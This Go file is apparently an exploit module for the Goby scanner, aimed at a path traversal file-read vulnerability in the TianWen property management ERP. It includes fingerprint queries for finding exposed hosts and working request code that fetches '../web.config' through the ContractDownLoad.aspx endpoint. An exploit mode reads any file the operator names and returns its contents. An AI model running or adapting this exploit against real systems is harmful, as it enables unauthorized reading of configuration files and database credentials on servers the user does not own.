package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "TWERP  /ContractDownLoad File Read Vulnerability",
    "Description": "<p>The company's business focuses on providing comprehensive solutions for informatized management and intelligent operations in six major sectors: property management, commercial operations, urban services governance, real estate customer relations, community services, and space IoT. Among these, the smart property management solution is the company's core business and key strength. Supporting these six major solutions, the product portfolio includes 12 product clusters and over 60 functional modules, encompassing master data, asset operations, financial billing, comprehensive budgeting, CRM, quality assurance, administrative office, human resources, procurement, data empowerment, mobile applications, and smart IoT. The company's technological advancement, rigorous control, detailed business processes, and user-friendly operations are industry-leading.</p>",
    "Product": "tw-soft",
    "Homepage": "http://www.tw369.com/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-08-01",
    "Author": "1538279017@qq.com",
    "FofaQuery": "(body=\"WebOffice.rar\" || body=\"Jscript-Ui\") && (body=\"天问物业ERP系统\" || body=\"国家版权局软著登字第1205328号\" || body=\"/HM/M_Main/frame/sso.aspx\")",
    "GobyQuery": "(body=\"WebOffice.rar\" || body=\"Jscript-Ui\") && (body=\"天问物业ERP系统\" || body=\"国家版权局软著登字第1205328号\" || body=\"/HM/M_Main/frame/sso.aspx\")",
    "Level": "1",
    "Impact": "<p>Sensitive Information Disclosure:Attackers can access and read files containing sensitive information, such as configuration files, database credentials, user passwords, and private data.</p><p> Server Configuration Exposure:Attackers can obtain server configuration files (e.g., .env, web.config, application.yml), learning detailed server configurations that can be used for further attacks.</p>",
    "Recommendation": "<p>Strict Access ControlsPrinciple of Least Privilege: Grant only the necessary file access permissions, ensuring that users and processes can access only the files they need for their operations.Authentication and Authorization: Implement authentication and authorization checks for all file access requests to ensure that only authorized users can access sensitive files. </p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "天问物业ERP系统 /ContractDownLoad 文件读取漏洞",
            "Product": "天问互联",
            "Description": "<p>&nbsp; 公司业务聚焦物业管理、商业运营、城服治理、地产客关、社区服务、空间物联六大行业信息化管理和智能化运营整体解决方案的提供，其中智慧物业管理解决方案是公司的核心业务和优势项目。配套六大解决方案，产品矩阵包括主数据、资产经营、财务收费、全面预算、CRM、品质保障、行政办公、人力资源、采购物料、数据赋能、移动应用、智慧物联等12大类产品集群、60多个功能模块，技术先进性、管控严谨性、业务细致性、操作便捷性业内领先。<br></p>",
            "Recommendation": "<p>严格的访问控制最小权限原则：仅允许必要的文件访问权限，确保用户和进程只能访问其操作所需的文件。身份验证和授权：对所有文件访问请求进行身份验证和授权检查，确保只有授权用户才能访问敏感文件。</p><p>&nbsp;输入验证与清理文件路径规范化：对用户输入的文件路径进行规范化处理，防止路径遍历攻击。禁止特殊字符：清理文件路径中的特殊字符，如 ..、/、\\ 等，避免绕过目录限制<br></p>",
            "Impact": "<p>敏感信息泄露：攻击者可以访问并读取包含敏感信息的文件，如配置文件、数据库凭据、用户密码和私人数据。服务器配置暴露：攻击者能够获取服务器配置文件（如 .env、web.config、application.yml 等），了解服务器的详细配置，从而进行进一步的攻击。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "TWERP  /ContractDownLoad File Read Vulnerability",
            "Product": "tw-soft",
            "Description": "<p>The company's business focuses on providing comprehensive solutions for informatized management and intelligent operations in six major sectors: property management, commercial operations, urban services governance, real estate customer relations, community services, and space IoT. Among these, the smart property management solution is the company's core business and key strength. Supporting these six major solutions, the product portfolio includes 12 product clusters and over 60 functional modules, encompassing master data, asset operations, financial billing, comprehensive budgeting, CRM, quality assurance, administrative office, human resources, procurement, data empowerment, mobile applications, and smart IoT. The company's technological advancement, rigorous control, detailed business processes, and user-friendly operations are industry-leading.<br></p>",
            "Recommendation": "<p>Strict Access ControlsPrinciple of Least Privilege: Grant only the necessary file access permissions, ensuring that users and processes can access only the files they need for their operations.Authentication and Authorization: Implement authentication and authorization checks for all file access requests to ensure that only authorized users can access sensitive files.&nbsp;</p>",
            "Impact": "<p>Sensitive Information Disclosure:Attackers can access and read files containing sensitive information, such as configuration files, database credentials, user passwords, and private data.</p><p>&nbsp;Server Configuration Exposure:Attackers can obtain server configuration files (e.g., .env, web.config, application.yml), learning detailed server configurations that can be used for further attacks.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10982"
}`
	postOrGet_fiejjp := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {

		//发送get请求
		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=" + fileUrl
		resp, err := setGetRequest(hostInfo, path, map[string]string{})

		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile="

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{

				"../web.config": "password",
			}

			// 函数继承

			uploadFileFunc := postOrGet_fiejjp

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{

				"config": {"../web.config", "password"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_fiejjp

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Customize"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true
			expResult.Output = resp
			return expResult

		},
	))

}
